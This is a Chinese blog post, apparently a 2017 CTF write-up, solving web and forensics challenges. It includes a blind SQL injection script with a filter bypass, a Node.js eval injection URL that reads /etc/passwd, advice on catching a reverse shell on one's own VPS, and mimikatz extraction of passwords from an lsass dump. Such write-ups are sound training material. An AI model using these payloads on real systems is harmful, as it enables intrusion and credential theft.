---
layout: post
title: 平衡信息杯_Web_WriteUp
date: 2017-10-22
categories: Write_Up
---

### Web300

界面只有一个It Works。注释里也没有任何东西。于是访问`index.php`准备看看是不是本页面，如果是，看是否有源码泄露。

![1](/images/posts/gxc/1.png)

结果访问后，发现跳转了界面。

![2](/images/posts/gxc/2.png)

点进去连接看什么样后是这个界面，可以注意到url多了参数`id`

![3](/images/posts/gxc/3.png)

可以推断，有可能存在文件包含，也可能存在SQL注入。经过尝试后，因为当`id=5-2`依旧是这个界面，所以是SQL注入。

发现过滤了`select`，用`sel/**/ect`就可以绕过了

自己写的是一个时间盲注脚本，但是因为服务器的问题，写wp的时候重新跑，没有顺利跑完。给出队友写的脚本：

	import requests
	import string
	
	payloads = string.printable
	letters = ''
	
	for i in range(1, 17):
	    for payload in payloads:
	        # url = 'http://39.108.7.112/show.php?id=1+and+ascii(mid(database(),{0},1))={1}'.format(str(i), ord(payload))
	        # url = 'http://39.108.7.112/show.php?id=1+and+ascii(mid((select+schema_name+from+information_schema.schemata+limit+1,1),{0},1))={1}'.format(
	            str(i), ord(payload))
	        url = 'http://39.108.7.112/show.php?id=1+and+ascii(mid((select+flag+from+gxnnctf2017.flag),{0},1))={1}'.format(str(i), ord(payload))
	        res = requests.get(url).content
	        print url
	        if 'id' in res:
	            letters += payload
	            print letters
	            break
	            
这个布尔注入的脚本可以拿到flag。

### Web200

这道题因为服务器挂了，没有截图。提示要传一个echo给服务器，传了后发现可以输出数字，就跟`echo`一样。输入字符和不输入的时候会报错。报错的时候可以发现调用了`eval`来执行传入的参数。

因为网址是`nodejs`开发的，所以`eval`会将字符当作代码执行。从而造成匿名函数的使用，可以通过`nodejs`的`fs`模块读取文件。代码如下：

	http://120.78.94.249/?echo=res.end(require(%27fs%27).readFileSync(%27/etc/passwd%27).toString())

但是因为js的代码能力不足。没有通过写匿名函数成功遍历目录找到flag。但是在GitHub发现一个脚本，可以反弹一个shell回来。

	https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

此处注意要用在公网的电脑监听，否则不一定能收到。最好的就是生成反弹到自己的vps上。

最后在上级目录发现了flag目录里面的flag。

### Web100

Web100是一个html，打开后发现代码如下：

	<script>
	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 c=E;g m(){2 8=p.q;2 6=l j();f(8.w("?")!=-1){2 h=8.r(1);5=h.9("&");d(2 i=0;i<5.o;i++){6[5[i].9("=")[0]]=u(5[i].9("=")[1])}}v 6}g n(4,s,e){7="";d(i=0;i<4.o;i++){k=(s+e)%c;t=e;e=s+e;s=t;7+=4[i]^k}f(7=="x")b.a("C\'s z!");B b.a("A\'s y!")}2 3=l j();3=m();b.a(3);n(3[\'4\'],F,D);',42,42,'||var|Request|key|strs|theRequest|cipher|url|split|log|console|iv|for||if|function|str||Object||new|GetRequest|enc|length|location|search|substr|||unescape|return|indexOf|34558914423312210022264341011282361161032135513678115123012499|Wrong|Right|Something|else|That|21|0xff|13'.split('|'),0,{}))
	</script>
	
是一个经过混淆加密的javascript。关于代码混淆加密可以参考[phpjiami数种解密方法](https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html)(虽然文章是PHP的，看似跟Javascript无关，但其实本质都一样)。所以这里我们选择将eval改为alert执行试试，果然弹出了源码。

![4](/images/posts/gxc/4.png)

源码如下：

	var iv = 0xff;
	
	function GetRequest() {
		var url = location.search;
		var theRequest = new Object();
		if (url.indexOf("?") != -1) {
			var str = url.substr(1);
			strs = str.split("&");
			for (var i = 0; i < strs.length; i++) {
				theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1])
			}
		}
		return theRequest
	}
	function enc(key, s, e) {
		cipher = "";
		for (i = 0; i < key.length; i++) {
			k = (s + e) % iv;
			t = e;
			e = s + e;
			s = t;
			cipher += key[i] ^ k
		}
		if (cipher == "34558914423312210022264341011282361161032135513678115123012499") console.log("That's Right!");
		else console.log("Something's Wrong!")
	}
	var Request = new Object();
	Request = GetRequest();
	console.log(Request);
	enc(Request['key'], 13, 21);
	
可以看到，需要传入一个参数key，如果key经过enc函数后，生成的cipher等于`34558914423312210022264341011282361161032135513678115123012499`这一串的时候，key就是flag。enc的核心算法是一个异或，通过逆写算法，可以得到key。稍微修改下代码逻辑，记录一些辅助量如下图：

![10](/images/posts/gxc/10.png)

当传入的数据够长的时候，我们需要将`k`和根据`k`生成的`flag`一一对应起来，最后形成`cipher`=`flag`。此时的k就是我们真正的flag。给出求出key的脚本：

	iv = 0xff
	s = 13
	e = 21
	k1 = []
	for i in range(0, 24):
	    k = (s + e) % iv
	    s, e = e, s + e
	    k1.append(k)
	cipher = "34 55 89 144 233 122 100 222 64 34 101 128 236 116 103 213 55 13 67 81 151 230 124 99"
	flag = []
	
	cipher1 = str.split(cipher)
	
	for x in range(0, 24):
	    for y in range(0, 9):
	        if y ^ int(k1[x]) == int(cipher1[x]):
	            flag.append(y)
	            print flag
	            break
	
	flag1 = "".join(map(str, flag))
	print flag1

后来因为一些原因flag改掉，改为源码算法的名称，直到最后都无人能解。算法名为:`Fibonacci_sequence`斐波拉契数列。


### Misc300

这道题是一个流量题，80MB左右的流量包，跑的很崩溃。跑了之后，查看http流量。看到关键请求，10.211.55.6向10.211.55.8的一个test.php发了post请求，请求内容暴露了test.php是一个一句话木马。

![5](/images/posts/gxc/5.png)

将请求的数据base64解码还原后。一路跟踪数据后可以发现，攻击者(10.211.55.6)通过让lsass.exe崩溃，然后下载崩溃后产生的lsass.dmp，其中有系统的内存信息，内存信息中有管理员账户密码。最后过滤tcp数据时发现攻击者通过3389登录了名为ctfflag的用户。所以我们的flag就是ctfflag的密码。我们也将lsass.dmp下载出来，用mimikatz读取密码即可。

![6](/images/posts/gxc/6.png)

![7](/images/posts/gxc/7.png)

其中有两个这样的很大的文件，还有一个在最末。只有一个里面包含密码。追踪流量的话，也能看出来，这是攻击者在下载lsass.dmp文件。

![8](/images/posts/gxc/8.png)

所以我们将dmp文件下载后，用010editor之类的软件将http头去掉，就可以用mimikatz读取了。结果如下：

![9](/images/posts/gxc/9.png)

得到flag。

转载请注明：[碎雪的小屋](http://RoyTse.github.io) » [平衡信息杯_Web_WriteUp](http://RoyTse.github.io/2017/10/平衡信息杯_Web_WriteUp/) 